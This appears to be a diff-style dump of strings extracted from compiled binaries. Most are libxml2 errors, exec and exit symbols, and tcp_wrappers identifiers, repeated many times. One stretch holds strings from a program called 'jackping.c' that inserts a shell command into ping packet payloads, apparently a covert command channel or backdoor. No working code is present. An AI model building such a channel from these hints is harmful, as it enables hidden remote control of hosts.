+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+exit
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
+Internal error: xmlSchemaCheckElemValConstr, type is missing... skipping validation of the value constraint
+exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+exit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+re_exec
+atexit
+exit
+_exit
+regexec
+regexec
+__cxa_atexit
+atexit failed
+regexec
+__cxa_atexit
+atexit failed
+/libexec/ld-elf.so.1
+regexec
+atexit
+re_exec
+atexit
+regexec
+atexit
+ENV_CMDOPTS
+exit
+ENV_CMDOPTS
+atexit
+_exit
+exitCode
+ENV_CMDOPTS
+_exit
+atexit
+ENV_CMDOPTS
+exitCode
+atexit
+ENV_CMDOPTS
+exit
+ENV_CMDOPTS
+execl
+sleep
+regexec
+_exit
+remap: rule %d: exit
+execl /bin/sh: %m
+@(#) shell_cmd.c 1.5 94/12/28 17:42:44
+@(#) clean_exit.c 1.4 94/12/28 17:42:19
+atexit
+exit
+justquit
+_xexit_cleanup
+xexit
+_exit
+regexec
+Usage: %s [-vcl][-a address][-m mappings][-u user][-t timeout][-r option...] [-s] [directory ...]
+remap: rule %d: exit
+_exit
+atexit
+regexec
+_exit
+atexit
+regexec
+atexit
+_exit
+exit
+regexec
+_exit
+atexit
+_exit
+regexec
+atexit
+regexec
+_exit
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+exit
+_exit
+regexec
+atexit
+execl
+exit
+couldn't spawn shell
+couldn't spawn shell
+exit 0
+Exec format error
+Cannot exec a shared library directly
+/usr/libexec/getconf
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+__libc_atexit
+couldn't spawn shell
+exit 0
+Exec format error
+Cannot exec a shared library directly
+/usr/libexec/getconf
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+__libc_atexit
+execl
+exit
+couldn't spawn shell
+execl
+sleep
+execv
+_exit
+execv %s: %m
+%d execl %s
+%s: exit signal 0x%x
+%s: exit status 0x%x
+%s/%s server failing (looping), service terminated
+execve
+atexit
+atexit failed
+execve
+atexit
+mapping information
+Exec format error
+warning, unknown root shell
+/etc/shells
+shells-XXXXX
+shells-%d
+initshells
+execve
+atexit
+atexit failed
+/usr/libexec/ld-elf.so.1
+execve
+nanosleep
+atexit
+warning, unknown root shell
+/etc/shells
+shells-XXXXX
+shells-%d
+initshells
+mapping information
+Exec format error
+/usr/libexec/ld-elf.so.1
+execve
+nanosleep
+atexit
+execve
+__cxa_atexit
+execve
+atexit
+atexit failed
+atexit
+execve
+getexecname
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+atexit failed
+atexit
+_exit
+execve
+getexecname
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+atexit failed
+execve
+__cxa_atexit
+pcre_exec
+atexit failed
+sleep
+exit
+Exiting prematurely!
+CMD environment variable is not set.
+Calling addcmd
+SENDTO:    orig msg = %d, cmd buf = %d
+Exiting normally
+ADDCMD:    copied %d of orig buf to pkt
+ADDCMD:    loc %d, pad %d, space %d
+ADDCMD:    cmdhdr_t %d, cmdlen %d
+oops:   CMD is too big to fit with protocol payload
+ADDCMD:    added cmd [%s]
+ADDCMD:    added port [%d]
+jackping.c
+cmdsent
+addcmd
+build_ping
+sleep@@GLIBC_2.0
+exit@@GLIBC_2.0
+exit
+warning:  CMD environment variable is not set.
+oops:	CMD is too big to fit with protocol payload
+cmdsent
+addcmd
+exit@@GLIBC_2.0
+exit
+warning:  CMD environment variable is not set.
+oops:	CMD is too big to fit with protocol payload
+cmdsent
+addcmd
+exit
+exit
+warning:  CMD environment variable is not set.
+oops:	CMD is too big to fit with protocol payload
+cmdsent
+addcmd
+exit@@GLIBC_2.0
+exit
+warning:  CMD environment variable is not set.
+oops:	CMD is too big to fit with protocol payload
+grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\
+mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\
+cmdsent
+addcmd
+exit@@GLIBC_2.0
+atexit
+exit
+~/.readcmd_history
+grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\
+mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\
+readcmd.c
+atexit@@GLIBC_2.0
+exit@@GLIBC_2.0
+exit
+atexit
+atexit
+atexit
+exit
+_exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+_exit
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+atexit
+_exit
+execve
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+_exit
+atexit
+_get_exit_frame_monitor
+execve
+execve
+exit
+atexit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+_exit
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+atexit
+_exit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+atexit
+execve
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+/usr/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+_exit
+atexit
+execve
+exit
+/libexec/ld-elf.so.1
+execve
+atexit
+/libexec/ld-elf.so.1
+execve
+atexit
+execve
+exit
+execve
+exit
+execve
+exit
+execve
+exit
+_exit
+execve
+atexit
+execve
+exit
+atexit
+_exit
+execve
+execve
+exit
+_exit
+atexit
